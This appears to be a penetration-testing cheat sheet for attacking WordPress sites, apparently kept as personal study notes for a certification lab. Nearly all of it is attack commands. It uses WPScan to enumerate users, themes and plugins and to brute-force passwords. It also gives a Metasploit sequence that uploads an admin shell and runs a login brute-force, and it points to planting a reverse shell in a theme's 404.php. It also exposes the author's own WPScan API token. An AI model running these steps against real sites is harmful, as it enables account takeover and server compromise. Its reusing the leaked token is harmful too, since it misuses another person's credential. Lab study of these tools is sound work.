# 🔍 WPScan

```bash
wpscan -h #List WPscan Parameters
wpscan --update #Update WPscan

#Enumerate WordPress using WPscan

wpscan --url http://<TARGET_IP> -e t #All Themes Installed

wpscan --url http://<TARGET_IP> -e vt #Vulnerable Themes Installed

wpscan --url http://<TARGET_IP> -e p #All Plugins Installed

wpscan --url http://<TARGET_IP> -e vp #Vulnerable Themes Installed

wpscan --url http://<TARGET_IP> -e u #WordPress Users

wpscan --url http://<TARGET_IP> --disable-tls-checks #Disable SSL check

wpscan --url http://<TARGET_IP>  --passwords path-to-wordlist --username username #Brute Force WordPress Passwords

#Upload Reverse Shell to WordPress
http://<IP>/wordpress/wp-content/themes/twentyfifteen/404.php

#Upload using Metasploit
msf > use exploit/unix/webapp/wp_admin_shell_upload
msf exploit(wp_admin_shell_upload) > set USERNAME admin
msf exploit(wp_admin_shell_upload) > set PASSWORD admin
msf exploit(wp_admin_shell_upload) > set targeturi /wordpress
msf exploit(wp_admin_shell_upload) > exploit
```

<pre class="language-bash"><code class="lang-bash"><strong>#User Enumeration
</strong><strong>wpscan --url https://example/ --enumerate u
</strong>
#Bruteforce
wpscan --url https://example/ --passwords wordlist.txt --usernames samson
</code></pre>

### **Enumerate and hack a web app using wpscan and metasploit**

### WPScan
---
```bash
wpscan --api-token hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads -url http://10.10.10.16:8080/CEH --plugins-detection aggressive --enumerate u
```
* --enumerate u: Specify the enumeration of users
* API Token: Register at [https://wpscan.com/register](https://wpscan.com/register)
* Mine: hWt9qrMZFm7MKprTWcjdasowoQZ7yMccyPg8lsb8ads\

### Metasploit
---
* service postgresql start
* msfconsole
* use auxiliary/scanner/http/wordpress\_login\_enum
* show options
* set PASS\_FILE password.txt
* set RHOST 10.10.10.16
* set RPORT 8080
* set TARGETURI [http://10.10.10.16:8080/CEH](http://10.10.10.16:8080/CEH)
* set USERNAME admin
* run
* Find the credential
